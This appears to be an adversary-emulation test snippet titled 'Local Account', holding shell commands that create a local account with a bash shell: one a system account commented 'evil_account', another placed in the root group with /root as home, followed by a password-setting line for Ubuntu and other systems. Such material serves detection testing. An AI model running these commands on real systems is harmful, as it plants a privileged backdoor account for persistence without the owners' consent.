
# Local Account

# without root
useradd -M -N -r -s /bin/bash -c evil_account #{username}

# with root
useradd -g 0 -M -d /root -s /bin/bash #{username}
if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "#{username}:#{password}" | sudo chpasswd; else echo "#{password}" | passwd --stdin #{username}; fi;



